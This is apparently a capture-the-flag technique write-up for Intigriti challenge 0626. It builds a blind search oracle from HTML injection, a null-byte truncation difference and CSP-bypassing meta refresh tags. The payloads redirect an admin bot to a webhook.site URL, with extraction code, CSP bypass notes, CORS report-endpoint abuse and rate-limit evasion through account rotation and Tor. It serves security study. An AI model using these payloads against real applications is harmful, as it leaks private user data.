# Blind Search Oracle via HTML Injection + Null Byte Parser Differential

## Trigger
- App has a search feature (LIKE prefix or contains query)
- Search results page reflects user input unescaped in HTML
- Admin bot / headless browser visits user-controlled URLs
- CSP blocks script execution (nonce-based or strict)
- Meta refresh is not blocked by CSP

## Technique Summary

Construct a blind oracle that leaks whether a LIKE prefix matches a target note/record, using:
1. **Null byte parser differential** — SQLite/C truncates at `\x00`, Python/HTML renders full string
2. **HTML injection in body** — unescaped query in "not found" message (only renders on no-match)
3. **HTML injection in head** — via `description` or similar param, always renders
4. **Meta refresh** — CSP bypass (not script execution), redirects bot to attacker webhook

## Oracle Variants

### Negative Oracle (simpler, less reliable)
- Inject meta refresh in BODY via null byte in `q` param
- Body "not found" section only renders when LIKE has no match
- **Hit = no match, No hit = match**
- Problem: "no hit" is ambiguous (match OR bot timeout/rate-limit)

### Positive Oracle (recommended)
- HEAD: inject meta refresh to webhook via `description` param (always fires)
- BODY: inject meta refresh to throwaway URL via `q` with null byte (only on no-match, overrides HEAD)
- **Hit = match, No hit = no match**
- Much more reliable: positive signal is trustworthy

## Payload Structure (Positive Oracle)

```
/search?q=[PREFIX]%25%00<meta http-equiv="refresh" content="0;url=https://example.com/sink">
       &description="><meta http-equiv="refresh" content="0;url=https://webhook.site/[UUID]?x=[LABEL]">
       &owner=[USERNAME]
```

### How it works:
1. `%25` = literal `%` (LIKE wildcard after null truncation)
2. `%00` = null byte (truncation point for SQL, transparent to HTML)
3. DB sees: `LIKE 'PREFIX%'` (prefix match)
4. HTML renders full string including meta tags
5. On MATCH: no "not found" → no body meta → HEAD meta fires → **webhook HIT**
6. On NO MATCH: "not found" renders → body meta (0s) overrides HEAD → redirect to sink → **no hit**

## LIKE Wildcard Pitfalls

### `_` is a single-char wildcard
- When testing position-by-position, `_` in your prefix matches ANY character
- If `_` hits but no specific char does, the real character is likely `%` (literal)
- Solution: use `_` to skip unmatchable positions, extract surrounding chars

### `%` is a multi-char wildcard
- If the target string contains literal `%`, you CANNOT match it directly in LIKE
- `LIKE 'prefix%%'` is just redundant wildcard, not literal %
- Detect via: char position exists (`prefix_X` matches) but no specific char matches

### Case sensitivity
- SQLite LIKE: case-insensitive for ASCII letters (a=A)
- PostgreSQL LIKE: case-sensitive (use ILIKE for insensitive)
- Test early: `prefix` vs `PREFIX` to determine DB behavior

## Extraction Strategy

```python
# For each position:
# 1. Test all chars in charset
# 2. If one hits → that's the char, advance
# 3. If none hit but prefix_+_ hits → position is literal %, use _ to skip
# 4. Continue: known + '_' + next_candidate

CHARSET = '0123456789abcdefghijklmnopqrstuvwxyz}-'

# Skip literal % positions with _
if no_char_matches and oracle(known + '_'):
    known += '_'  # literal % at this position
```

## Chrome Meta Refresh URL Parsing Pitfalls

### `"` terminates the URL
Chrome's meta refresh parser treats `"` (double-quote) as a URL terminator. When using dangling markup to capture page content into a meta refresh URL, the captured content often starts with `">` (from the original tag close), causing Chrome to extract an empty/truncated URL.

**Consequence:** Dangling single-quote technique (`content='0;url=HOOK?x=` spanning to a `'` later in the page) fails because the first `"` in captured content terminates the URL before any useful data.

**Tested:** Chrome 137 (June 2026) — `"` in meta refresh URL causes truncation. `<`, `>`, spaces, and newlines are tolerated (percent-encoded by Chrome).

### Dangling meta refresh alternatives when `"` blocks capture:
- Use description for a CLEAN (non-dangling) always-fire redirect → detect ABSENCE of signal for match
- Use null-byte exact-match oracle instead of prefix+dangling exfiltration
- Meta refresh in body "not found" message (conditional, no dangling needed)

## Null Byte: Exact Match vs Prefix Match Behavior

When the search backend (Flask/SQLite) encounters a null byte in the query:
- **Search engine**: truncates at null, uses text BEFORE null as query
- **HTML renderer**: outputs FULL string including after null (unescaped)

**Critical behavioral difference:**
- `q=PARTIAL_PREFIX%00META` → search matches prefix, BUT "not found" STILL renders (partial != exact)
- `q=EXACT_FULL_TITLE%00META` → exact match → NO "not found" rendered
- `q=PREFIX` (no null) → prefix match → no "not found" (standard prefix behavior)

**Oracle implication:** Null byte oracle detects EXACT FULL TITLE match only. It cannot detect partial prefix matches. For char-by-char extraction, append `}` or known suffix to test completeness: `INTIGRITI{candidate}%00<meta...>`.

## CSP Nonce Bypass Attempts (Chrome 137, June 2026 — ALL FAILED)

Confirmed blocked by Chrome's CSP implementation:
- `<script type="importmap">` — requires nonce (fixed in Chrome ~117+)
- `<script type="speculationrules">` — requires nonce
- `<script type="module">` — requires nonce
- `<meta http-equiv="Content-Security-Policy">` — only restricts further (intersection), never loosens HTTP CSP
- `<base href>` — blocked by `base-uri 'none'`
- CSS attribute selectors for nonce exfil — blocked by `style-src 'nonce-X'`
- `<link rel="preload" as="script">` — blocked by `default-src 'none'`
- Inline style attributes — blocked by `style-src 'nonce-X'` (no `style-src-attr` fallback in Chrome 137)
- Script src with JSON MIME type — Chrome strict MIME checking blocks regardless of X-Content-Type-Options

**The only confirmed working exfiltration vector under `default-src 'none'`:** meta refresh navigation (not controlled by CSP unless `navigate-to` directive is present).

## Rate Limiting Considerations

- CTF bots typically have per-user AND global rate limits
- Start with 12-15s between requests minimum
- If bot stops responding: wait 5-30+ minutes (global cooldown)
- Account rotation helps with per-user limits but NOT global
- Positive oracle is critical: reduces false positives from bot downtime
- Binary search (testing ranges) can reduce total requests needed

### CRITICAL: Bot Kill Prevention (Intigriti 0626 Lesson)

Sending 100+ rapid requests killed the bot for 34+ hours. Not IP-based (Tor from different IP also dead). The bot infrastructure has a **global hard cap** — once exhausted, no amount of waiting, IP rotation, or new accounts recovers it within the same day.

**Prevention strategy:**
1. NEVER brute-force linearly through full charset at <5s intervals
2. Use 15-20s minimum between requests from the START
3. Limit to ~50 requests per session, then pause 30+ minutes
4. Test charset in smart order (common chars first: `_a-z0-9}` for flags)
5. If bot stops mid-extraction, STOP IMMEDIATELY — don't keep hammering
6. Wait 24h+ before resuming if bot goes silent after 5+ minutes of attempts
7. Use binary search or batch elimination to minimize total oracle calls

## CORS on CSP Report Endpoint (Exfiltration Path)

When the CSP `report-uri` points to a same-origin endpoint:
- Check for CORS headers: `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials: true`
- If CORS reflects arbitrary Origin with credentials → ANY same-origin XSS can fetch stored reports
- Reports contain `script-sample` (first 40 chars of blocked inline script) — potential data exfil
- Intended attack: achieve XSS on a NO-CSP page → fetch /csp-report → read stored violation data

**Intigriti 0626 finding:** `/csp-report/USERNAME` reflected any Origin with `credentials: true`. Returns 403 for regular users, 401 without auth. Admin likely gets 200. No CSP header on this endpoint. Content-type: `application/json` (not exploitable as script src due to strict MIME checking).

## Admin Bot Behavior (CTF Pattern)

- Admin bot visits paths on same origin only (path must start with `/`)
- Meta refresh to EXTERNAL URLs: **WORKS** (bot follows redirect off-domain)
- Bot does NOT execute JavaScript on external pages (closes after navigation)
- Bot rate-limited: ~12-15s between reliable responses, global hard cap exists
- SameSite=None cookies sent on cross-origin requests from bot's browser
- No X-Frame-Options on challenge pages (frameable from external)

**Implication:** CORS endpoint is usable ONLY from same-origin XSS, not from external exploit page. The full attack requires: CSP bypass → XSS on challenge domain → fetch CORS endpoint with admin creds.

## Title Enumeration Strategy (Before Content Extraction)

Before brute-forcing content char-by-char, enumerate COMMON note titles first using exact-match oracle. This is much faster than blind extraction:

```python
# Test common note titles to understand data structure
for title in ["flag", "Flag", "FLAG", "secret", "admin", "note", "password"]:
    if test_exact(title):
        print(f"Found note titled: {title}")
```

**Intigriti 0626 lesson:** Admin had 3 notes with titles "Flag", "secret", and "INTIGRITI{ll}" (the actual flag). Testing common words first found "secret" and "Flag" in ~5 requests each. The flag itself was a note TITLE (not content), making exact-match oracle sufficient without content exfiltration.

## Example: Intigriti Challenge 0626

- App: Flask "Inside Job" — private notes, search by title prefix
- CSP: `default-src 'none'; script-src 'nonce-X'`
- Injection: `description` param in HEAD meta, `q` param in body "not found"
- Admin had multiple notes: "Flag", "secret", "INTIGRITI{ll}"
- Flag was a note TITLE extracted via exact-match null-byte oracle
- Bot had ~12s minimum cooldown, longer global limit after heavy use
- Total requests to find flag: ~60 (title enumeration + candidate testing)
